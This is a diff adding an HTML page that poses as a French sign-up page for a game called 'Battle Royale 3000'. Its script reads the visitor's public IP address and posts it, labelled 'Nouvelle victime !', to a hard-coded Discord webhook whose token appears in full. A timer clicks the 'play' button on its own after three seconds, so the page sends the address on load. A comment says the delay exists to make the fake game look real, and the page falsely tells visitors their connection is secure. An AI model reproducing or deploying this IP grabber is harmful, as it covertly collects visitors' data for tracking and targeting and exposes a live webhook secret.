@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Battle Royale 3000 - Inscription</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+        }
+        .container {
+            margin: 50px auto;
+            width: 80%;
+            padding: 20px;
+            background: #16213e;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            color: #ff0000;
+        }
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #ff3333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 BATTLE ROYALE 3000 - INSCRIPTION 🔥</h1>
+        <p>Rejoins la bataille finale !</p>
+        <button onclick="sendIPToDiscord()">JOUER MAINTENANT</button>
+        <p style="font-size: 12px; color: #ff0000;">*Votre connexion est sécurisée*</p>
+    </div>
+
+    <script>
+        function sendIPToDiscord() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const webhookUrl = "https://discord.com/api/webhooks/1451689514731966619/zHtZhlpxXUczGghVi6QmEZ1kt7E8tf4-LC4ofpYRXU9F4QaM-0QrmD86UMCjff0fyckD"; // Remplace ici
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `🎮 **Nouvelle victime !** 🎮\nIP: \`${ip}\`\nPseudo: \`${Math.random().toString(36).substring(2, 8)}\``
+                        })
+                    })
+                    .then(() => console.log("IP envoyée !"))
+                    .catch(() => console.log("Erreur."));
+                })
+                .catch(() => console.log("Erreur."));
+        }
+
+        // Simule un chargement pour faire croire que c'est un vrai jeu
+        setTimeout(() => {
+            document.querySelector('button').click();
+        }, 3000);
+    </script>
+</body>
+</html>
